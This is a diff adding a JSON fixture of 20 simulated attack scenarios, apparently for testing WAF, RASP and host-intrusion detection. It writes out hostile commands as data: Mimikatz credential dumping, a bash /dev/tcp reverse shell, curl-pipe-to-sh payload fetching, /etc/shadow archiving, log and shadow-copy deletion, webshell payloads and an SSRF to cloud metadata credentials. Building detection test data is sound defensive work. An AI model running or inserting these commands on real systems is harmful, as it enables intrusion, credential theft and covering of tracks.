@@ -1,0 +1,427 @@
+{
+ "form": "F3",
+ "scenarios": [
+  {
+   "idx": 1,
+   "technique": "Mimikatz 抓取 LSASS 凭据（sekurlsa::logonpasswords）",
+   "stack": "tomcat",
+   "host_num": 33,
+   "shape": [
+    "hids"
+   ],
+   "path": "/manager/html/upload",
+   "carrier": "war=..%2Ftmp%2Fsvc.war&cmd=sekurlsa::logonpasswords",
+   "rasp_evidence": "",
+   "hids": [
+    "mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" mimikatz.exe cmd.exe /c C:\\Windows\\Temp\\m.exe <== /usr/sbin/sshd -D"
+   ],
+   "ua": "windows-chrome",
+   "deltas": [
+    0
+   ]
+  },
+  {
+   "idx": 2,
+   "technique": "Windows 计划任务持久化（schtasks /create /sc minute）",
+   "stack": "tomcat",
+   "host_num": 47,
+   "shape": [
+    "waf",
+    "rasp",
+    "hids"
+   ],
+   "path": "/api/v1/scheduler/run",
+   "carrier": "cmd=schtasks /create /tn Upd /sc minute /mo 5 /tr C:\\Windows\\Temp\\u.exe",
+   "rasp_evidence": "{\"cmd_inject\": \"schtasks /create /sc minute\", \"sched_task\": true}",
+   "hids": [
+    "schtasks /create /tn Upd /sc minute /mo 5 /tr C:\\Windows\\Temp\\u.exe schtasks.exe java.exe -jar C:\\svc\\gw.jar <== services.exe"
+   ],
+   "ua": "windows11-edge",
+   "deltas": [
+    0,
+    1,
+    86
+   ]
+  },
+  {
+   "idx": 3,
+   "technique": "Windows 服务持久化（sc create binPath 指向 C:\\Windows\\Temp 载荷）",
+   "stack": "java",
+   "host_num": 12,
+   "shape": [
+    "hids"
+   ],
+   "path": "/api/v1/agent/reload",
+   "carrier": "bin=C:\\Windows\\Temp\\svc.exe&start=auto",
+   "rasp_evidence": "",
+   "hids": [
+    "sc create SmSvc binPath= C:\\Windows\\Temp\\svc.exe start= auto sc.exe cmd.exe /c sc create SmSvc binPath= C:\\Windows\\Temp\\svc.exe start= auto <== services.exe"
+   ],
+   "ua": "windows-firefox",
+   "deltas": [
+    0
+   ]
+  },
+  {
+   "idx": 4,
+   "technique": "Linux 反连 shell（bash -i 重定向 /dev/tcp）",
+   "stack": "nginx",
+   "host_num": 61,
+   "shape": [
+    "hids"
+   ],
+   "path": "/uploads/run.sh",
+   "carrier": "file=1.sh&exec=bash+-i+%3E%26+/dev/tcp/10.20.5.19/8443",
+   "rasp_evidence": "",
+   "hids": [
+    "bash -i >& /dev/tcp/10.20.5.19/8443 0>&1 /bin/bash bash -i <== /bin/sh -c 'bash -i' <== nginx: worker process"
+   ],
+   "ua": "linux-x11-chrome",
+   "deltas": [
+    0
+   ]
+  },
+  {
+   "idx": 5,
+   "technique": "挖矿进程 xmrig 连接矿池（高 CPU 占用）",
+   "stack": "node",
+   "host_num": 22,
+   "shape": [
+    "hids"
+   ],
+   "path": "/api/v1/ci/build",
+   "carrier": "job=build&cache=x&hook=/tmp/.kr/xmrig",
+   "rasp_evidence": "",
+   "hids": [
+    "xmrig -o stratum+tcp://10.20.5.77:3333 -u 4ANf8kQ -p x xmrig xmrig <== /bin/sh -c '/tmp/.kr/xmrig -o st'"
+   ],
+   "ua": "linux-x11-chrome",
+   "deltas": [
+    0
+   ]
+  },
+  {
+   "idx": 6,
+   "technique": "凭据打包落地（tar 打包 /etc/shadow 到隐藏路径）",
+   "stack": "nginx",
+   "host_num": 74,
+   "shape": [
+    "waf",
+    "hids"
+   ],
+   "path": "/backup/export",
+   "carrier": "src=../../etc/shadow&dst=/tmp/.cache.tgz",
+   "rasp_evidence": "{\"path_traversal\": \"../../etc/shadow\", \"dst\": \"/tmp/.cache.tgz\"}",
+   "hids": [
+    "tar czf /tmp/.cache /etc/shadow /etc/passwd tar czf /tmp/.cache <== /bin/sh -c 'tar' <== nginx: worker process"
+   ],
+   "ua": "linux-x11-chrome",
+   "deltas": [
+    0,
+    88
+   ]
+  },
+  {
+   "idx": 7,
+   "technique": "日志与卷影清理（wevtutil cl Security + vssadmin delete shadows）",
+   "stack": "tomcat",
+   "host_num": 55,
+   "shape": [
+    "hids"
+   ],
+   "path": "/manager/html/list",
+   "carrier": "type=war&path=/&clean=1",
+   "rasp_evidence": "",
+   "hids": [
+    "wevtutil cl Security && vssadmin delete shadows /all /quiet cmd.exe cmd.exe /c wevtutil cl Security && vss <== services.exe"
+   ],
+   "ua": "windows11-edge",
+   "deltas": [
+    0
+   ]
+  },
+  {
+   "idx": 8,
+   "technique": "JSP webshell 交互执行（shell.jsp 传 cmd 参数）",
+   "stack": "tomcat",
+   "host_num": 38,
+   "shape": [
+    "rasp",
+    "hids"
+   ],
+   "path": "/uploads/shell.jsp",
+   "carrier": "?cmd=id&pwd=/usr/local/tomcat",
+   "rasp_evidence": "{\"webshell\": \"shell.jsp\", \"cmd\": \"id\"}",
+   "hids": [
+    "id /usr/bin/id id <== /bin/sh -c 'id' <== /usr/local/tomcat/bin/catalina.sh"
+   ],
+   "ua": "windows-chrome",
+   "deltas": [
+    0,
+    57
+   ]
+  },
+  {
+   "idx": 9,
+   "technique": "PHP webshell 文件管理动作（?act=upload / filemgr）",
+   "stack": "php",
+   "host_num": 92,
+   "shape": [
+    "rasp",
+    "hids"
+   ],
+   "path": "/uploads/up.php",
+   "carrier": "?act=upload&path=/var/www/html&file=shell.php",
+   "rasp_evidence": "{\"upload\": \"shell.php\", \"act\": \"upload\"}",
+   "hids": [
+    "mv /tmp/php3f2a.tmp /var/www/html/shell.php /bin/mv mv <== /bin/sh -c 'mv /tmp/php3f' <== php-fpm: pool www"
+   ],
+   "ua": "mac-safari",
+   "deltas": [
+    0,
+    57
+   ]
+  },
+  {
+   "idx": 10,
+   "technique": "ASPX webshell 执行 whoami（cmd.aspx）",
+   "stack": "iis",
+   "host_num": 20,
+   "shape": [
+    "rasp",
+    "hids"
+   ],
+   "path": "/upload/cmd.aspx",
+   "carrier": "?cmd=whoami&dir=C:\\inetpub\\wwwroot",
+   "rasp_evidence": "{\"webshell\": \"cmd.aspx\", \"cmd\": \"whoami\"}",
+   "hids": [
+    "whoami /all C:\\Windows\\System32\\whoami.exe whoami /all <== cmd.exe /c whoami /all <== w3wp.exe -ap \"DefaultAppPool\" <== services.exe"
+   ],
+   "ua": "windows-firefox",
+   "deltas": [
+    0,
+    115
+   ]
+  },
+  {
+   "idx": 11,
+   "technique": "冰蝎/哥斯拉加密参数命令执行（payload Base64 参数）",
+   "stack": "spring",
+   "host_num": 18,
+   "shape": [
+    "rasp",
+    "hids"
+   ],
+   "path": "/api/v1/upload/gateway",
+   "carrier": "payload=Y21kIC9jIGlkO3dob2FtaQ%3D%3D&enc=base64",
+   "rasp_evidence": "{\"cmd\": \"id;whoami\", \"payload_enc\": \"base64-aes\"}",
+   "hids": [
+    "id;whoami /bin/bash id;whoami <== /bin/sh -c 'id;whoami' <== java -jar /opt/app/gw.jar"
+   ],
+   "ua": "mac-safari",
+   "deltas": [
+    0,
+    55
+   ]
+  },
+  {
+   "idx": 12,
+   "technique": "Go 应用参数注入（exec.Command 拼接 shell 元字符）",
+   "stack": "go",
+   "host_num": 27,
+   "shape": [
+    "rasp",
+    "hids"
+   ],
+   "path": "/api/v1/convert",
+   "carrier": "?url=%7Cid&format=json",
+   "rasp_evidence": "{\"cmd_inject\": \"|id\", \"lang\": \"go\"}",
+   "hids": [
+    "cat /etc/hosts /bin/cat cat /etc/hosts <== /bin/sh -c 'cat /etc/hosts' <== /opt/app/apiserver"
+   ],
+   "ua": "linux-x11-chrome",
+   "deltas": [
+    0,
+    88
+   ]
+  },
+  {
+   "idx": 13,
+   "technique": "API 网关直连命令注入（边缘 WAF 命中、无 web 访问日志）",
+   "stack": "go",
+   "host_num": 64,
+   "shape": [
+    "waf",
+    "rasp",
+    "hids"
+   ],
+   "path": "/api/v2/proxy/exec",
+   "carrier": "ip=10.20.3.14;id;cat /etc/hostname",
+   "rasp_evidence": "{\"cmd_inject\": \";id;cat /etc/hostname\", \"gw\": true}",
+   "hids": [
+    "curl -sS http://10.20.6.88:8080/api/v1/users /usr/bin/curl curl -sS <== /bin/sh -c 'curl' <== api-gw"
+   ],
+   "ua": "android14-pixel",
+   "deltas": [
+    0,
+    1,
+    119
+   ]
+  },
+  {
+   "idx": 14,
+   "technique": "gRPC-web 接口参数注入导致命令执行",
+   "stack": "go",
+   "host_num": 71,
+   "shape": [
+    "waf",
+    "rasp",
+    "hids"
+   ],
+   "path": "/grpc.gateway.Exec/Start",
+   "carrier": "1:{\"cmd\":\"x;id;uname -a\"} 5:true",
+   "rasp_evidence": "{\"cmd_inject\": \"x;id;uname -a\", \"grpc_web\": true}",
+   "hids": [
+    "id;uname -a /usr/bin/id id;uname -a <== /bin/sh -c 'id;uname -a' <== /opt/app/grpc-gw"
+   ],
+   "ua": "ios-iphone",
+   "deltas": [
+    0,
+    2,
+    59
+   ]
+  },
+  {
+   "idx": 15,
+   "technique": "容器 API 未授权创建 Pod 执行命令（k8s API 直连）",
+   "stack": "node",
+   "host_num": 45,
+   "shape": [
+    "waf",
+    "rasp",
+    "hids"
+   ],
+   "path": "/api/v1/namespaces/default/pods",
+   "carrier": "{\"metadata\":{\"name\":\"p1\"},\"cmd\":[\"sh\",\"-c\",\"id\"]}",
+   "rasp_evidence": "{\"container_api\": \"pods\", \"cmd\": \"id\"}",
+   "hids": [
+    "sh -c id /bin/sh sh -c id <== /usr/bin/containerd-shim <== kubelet --config=/var/lib/kubelet"
+   ],
+   "ua": "android14-pixel",
+   "deltas": [
+    0,
+    1,
+    58
+   ]
+  },
+  {
+   "idx": 16,
+   "technique": "消息队列管理台未授权（RabbitMQ management definitions）",
+   "stack": "java",
+   "host_num": 58,
+   "shape": [
+    "waf",
+    "rasp",
+    "hids"
+   ],
+   "path": "/api/definitions",
+   "carrier": "{\"parameters\":[{\"name\":\"cmd\",\"value\":\"/tmp/.rb/run\"}]}",
+   "rasp_evidence": "{\"unauth\": \"/api/definitions\", \"cmd\": \"/tmp/.rb/run\"}",
+   "hids": [
+    "sh -c /tmp/.rb/run /bin/sh sh -c /tmp/.rb/run <== beam.smp -W w -A 64 -- -root <== rabbitmq-server"
+   ],
+   "ua": "ios-iphone",
+   "deltas": [
+    0,
+    2,
+    59
+   ]
+  },
+  {
+   "idx": 17,
+   "technique": "数据库 Web 管理台写 webshell（phpMyAdmin INTO OUTFILE）",
+   "stack": "php",
+   "host_num": 66,
+   "shape": [
+    "waf",
+    "rasp",
+    "hids"
+   ],
+   "path": "/phpmyadmin/import.php",
+   "carrier": "sql=SELECT \"<?php passthru($_GET[c]);?>\" INTO OUTFILE \"/var/www/x.php\"",
+   "rasp_evidence": "{\"sql_write\": \"INTO OUTFILE /var/www/x.php\", \"webshell\": true}",
+   "hids": [
+    "chmod 755 /var/www/x.php /bin/chmod chmod 755 /var/www/x.php <== /bin/sh -c 'chmod 755' <== php-fpm: pool www"
+   ],
+   "ua": "windows-chrome",
+   "deltas": [
+    0,
+    1,
+    61
+   ]
+  },
+  {
+   "idx": 18,
+   "technique": "备份接口路径穿越读取配置（WAF 命中、应用无日志）",
+   "stack": "nginx",
+   "host_num": 29,
+   "shape": [
+    "waf",
+    "hids"
+   ],
+   "path": "/api/v1/backup/download",
+   "carrier": "file=../../../../etc/app/config.yml&mode=raw",
+   "rasp_evidence": "{\"path_traversal\": \"../../../../etc/app/config.yml\"}",
+   "hids": [
+    "cat /etc/app/cfg.yml /bin/cat cat /etc/app/cfg.yml <== /bin/sh -c 'cat /etc/app/cfg.yml' <== /opt/app/backupd"
+   ],
+   "ua": "android14-pixel",
+   "deltas": [
+    0,
+    88
+   ]
+  },
+  {
+   "idx": 19,
+   "technique": "上传接口覆盖 .htaccess 后触发命令",
+   "stack": "php",
+   "host_num": 114,
+   "shape": [
+    "waf",
+    "hids"
+   ],
+   "path": "/api/upload/avatar",
+   "carrier": "filename=.htaccess&content=AddType application%2fx-httpd-php+png",
+   "rasp_evidence": "{\"upload\": \".htaccess\", \"handler\": \"AddType x-httpd-php\"}",
+   "hids": [
+    "curl -s http://10.20.7.31/px.sh | sh /bin/sh sh -c curl -s http://10.20.7.31/px.sh <== apache2"
+   ],
+   "ua": "windows-android13",
+   "deltas": [
+    0,
+    58
+   ]
+  },
+  {
+   "idx": 20,
+   "technique": "SSRF 探测云元数据后主机侧 curl 内网",
+   "stack": "java",
+   "host_num": 68,
+   "shape": [
+    "waf",
+    "hids"
+   ],
+   "path": "/api/v1/fetch/image",
+   "carrier": "url=http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+   "rasp_evidence": "{\"ssrf\": \"169.254.169.254/latest/meta-data/iam\", \"blocked\": true}",
+   "hids": [
+    "curl -s http://10.20.8.5:8500/v1/kv/?recurse /usr/bin/curl curl <== java -jar /opt/app/fetcher.jar"
+   ],
+   "ua": "windows-android13",
+   "deltas": [
+    0,
+    118
+   ]
+  }
+ ]
+}
